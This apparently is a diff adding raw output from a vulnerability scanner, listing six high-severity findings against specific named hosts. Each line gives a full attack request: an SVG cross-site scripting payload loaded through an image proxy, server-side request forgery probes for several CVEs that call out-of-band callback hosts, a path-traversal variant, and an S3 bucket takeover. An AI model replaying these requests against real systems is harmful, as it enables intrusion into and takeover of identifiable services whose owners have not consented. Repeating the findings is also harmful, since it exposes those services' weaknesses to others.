@@ -1,0 +1,6 @@
+[retool-svg-xss] [http] [high] https://proxy.ferra.ag/api/imageProxy?url=https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/refs/heads/main/helpers/payloads/retool-xss.svg
+[splash-render-ssrf] [http] [high] https://proxy.ferra.ag/render.html?url=https://oast.live
+[CVE-2017-18638] [http] [high] https://proxy.ferra.ag/composer/send_email?to=IahV@gnHj&url=http://dbtdnjat7v5jgee27k0gn1x5hurwfr4py.oast.online
+[CVE-2015-8813] [http] [high] https://proxy.ferra.ag/Umbraco/feedproxy.aspx?url=http://dbtdnjat7v5jgee27k0gwtiwbwurjoybd.oast.online
+[CVE-2022-41412] [http] [high] https://proxy.ferra.ag/perfsonar-graphs/cgi-bin/graphData.cgi?action=ma_data&url=http://oast.fun/esmond/perfsonar/archive/../../../&src=8.8.8.8&dest=8.8.4.4
+[aws-bucket-takeover] [http] [high] https://s3.vestige.fi ["s3.vestige.fi"]
